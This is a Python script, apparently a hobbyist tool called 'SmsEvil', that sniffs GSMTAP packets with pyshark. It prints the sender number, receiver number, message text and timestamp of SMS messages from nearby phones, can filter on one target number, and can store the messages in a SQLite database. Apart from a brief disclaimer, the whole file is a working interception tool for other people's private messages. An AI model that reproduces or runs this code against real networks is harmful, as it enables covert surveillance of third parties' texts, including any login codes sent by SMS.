# coding: latin-1

"""
About: This program shows you sender number , receiver number, sms text, sending time of cellphones around you.

Disclaimer:-
This program was made to understand how GSM network works. Not for bad hacking !
We are not responsible for any illegal activity !

About:-
Author: sheryar (ninjhacks)
Created on : 20/6/2019
"""

import pyshark
from optparse import OptionParser
import os, sys

class SmsEvil:

    text = ""
    sender = ""
    receiver = ""
    time = ""

    def save_data(self):
        import sqlite3
        sql_conn = sqlite3.connect(options.save)
        sql_conn.execute('CREATE TABLE IF NOT EXISTS sms_data(id INTEGER PRIMARY KEY, text TEXT, sender TEXT, receiver TEXT , date_time timestamp)')
        sql_conn.execute('INSERT INTO sms_data(text, sender, receiver, date_time) VALUES ( ?, ?, ?, ?)',(self.text, self.sender, self.receiver, self.time + " " + self.date))
        sql_conn.commit()

    def output(self):
        if options.save:
            self.save_data()
        print(" \033[0;37;48m{:7s} \033[0;31;48m; \033[0;37;48m{:12s} \033[0;31;48m; \033[0;37;48m\033[0;37;48m{:12s} \033[0;31;48m; \033[0;37;48m{:20s}".format(self.time, self.sender, self.receiver, self.text))
        print ("\033[0;31;48m................................................................................")

    def header(self):
        os.system('clear')
        title = '''
   ▄██████▄     ▄████████   ▄▄▄▄███▄▄▄▄      ▄████████  ▄█    █▄   ▄█   ▄█      
  ███    ███   ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███ ███    ███ ███  ███      
  ███    █▀    ███    █▀  ███   ███   ███   ███    █▀  ███    ███ ███▌ ███      
 ▄███          ███        ███   ███   ███  ▄███▄▄▄     ███    ███ ███▌ ███      
▀▀███ ████▄  ▀███████████ ███   ███   ███ ▀▀███▀▀▀     ███    ███ ███▌ ███      
  ███    ███          ███ ███   ███   ███   ███    █▄  ███    ███ ███  ███      
  ███    ███    ▄█    ███ ███   ███   ███   ███    ███ ███    ███ ███  ███▌    ▄
  ████████▀   ▄████████▀   ▀█   ███   █▀    ██████████  ▀██████▀  █▀   █████▄▄██
                                                                       ▀        
                          ☠️  丂爪丂 丂几丨千千乇尺  ☠️'''
        print ("\033[0;31;48m" + title)
        print ("................................................................................")
        print("\033[0;37;48m  Time   \033[0;31;48m;    \033[0;37;48mSender    \033[0;31;48m;   \033[0;37;48mReceiver   \033[0;31;48m;                  \033[0;37;48mText                  ")
        print ("\033[0;31;48m................................................................................")

    def get_sms(self, capture):
        for packet in capture:
            layer = packet.highest_layer
            if (layer == "GSM_SMS"):
                gsm_sms = packet.gsm_sms
                if hasattr(gsm_sms, 'sms_text'):
                    self.time = packet.gsm_sms.scts_hour + ":" + packet.gsm_sms.scts_minutes + ":" + packet.gsm_sms.scts_seconds
                    self.date = packet.gsm_sms.scts_day + "/" + packet.gsm_sms.scts_month + "/" + packet.gsm_sms.scts_year
                    self.sender = packet.gsm_sms.tp_oa
                    self.receiver = packet[6].gsm_a_dtap_cld_party_bcd_num
                    self.text = packet.gsm_sms.sms_text
                    if options.number == "":
                        self.output()
                    elif options.number == self.sender:
                        self.output()
                    elif options.number == self.receiver:
                        self.output()

if __name__ == "__main__":
	parser = OptionParser(usage="%prog: [options]")
	parser.add_option("-i", "--iface", dest="iface", default="lo", help="Interface (default : lo)")
	parser.add_option("-p", "--port", dest="port", default="4729", type="int", help="Port (default : 4729)")    
	parser.add_option("-n", "--number", dest="number", default="", type="string", help='Phone number (default : None)')
	parser.add_option("-s", "--save", dest="save", default=None, type="string", help="Save all text messages to sqlite file. (default : None)")
	(options, args) = parser.parse_args()
try:
    SmsEvil = SmsEvil()
    SmsEvil.header()
    capture = pyshark.LiveCapture(interface=options.iface, bpf_filter="port {} and not icmp and udp".format(options.port))
    SmsEvil.get_sms(capture)
except:
    print ("Stop sniffing")
